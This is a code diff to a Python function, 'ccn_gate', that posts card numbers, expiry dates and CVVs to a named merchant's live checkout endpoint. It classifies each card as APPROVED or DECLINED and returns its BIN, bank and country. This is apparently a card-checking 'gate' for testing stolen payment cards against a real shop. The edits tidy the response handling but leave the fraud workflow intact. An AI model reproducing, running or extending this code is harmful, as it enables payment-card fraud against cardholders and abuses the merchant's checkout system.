@@ -106,7 +106,7 @@ def ccn_gate(card: str) -> dict:
             result = cliente.get("https://glorybee.com/checkout/cart/", headers=headers)
             form_id = capture(result.text, '"entity_id":"', '"')
 
-            # Request 7 (pago)
+            # Request pago
             headers = {"User-Agent": agente_user, "Content-Type": "application/x-www-form-urlencoded"}
             data = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}"
             result = cliente.post("https://glorybee.com/paya/checkout/request", data=data, headers=headers)
@@ -115,9 +115,14 @@ def ccn_gate(card: str) -> dict:
             message_text = capture(result.text, '"message":"', '"')
             message_code = capture(result.text, '"code":"', '"')
 
-            # Determinar estado
+            if not message_text:
+                message_text = "No response"
+            if not message_code:
+                message_code = "N/A"
+
+            # Determinar estado real
             status = "DECLINED"
-            if message_text and ("APPROVED" in message_text or "SUCCESS" in message_text):
+            if "APPROVED" in message_text.upper() or "SUCCESS" in message_text.upper():
                 status = "APPROVED"
 
             fin = time.time()
@@ -129,7 +134,7 @@ def ccn_gate(card: str) -> dict:
             return {
                 "card": f"{cc_number}|{mes}|{ano_number}|{cvv}",
                 "status": status,
-                "message": f"{message_text} | CODE: {message_code}" if message_text else "No response | CODE: N/A",
+                "message": f"{message_text} | CODE: {message_code}",
                 "bin": bin_data["bin"],
                 "bank": bin_data["bank"],
                 "country": bin_data["country"],
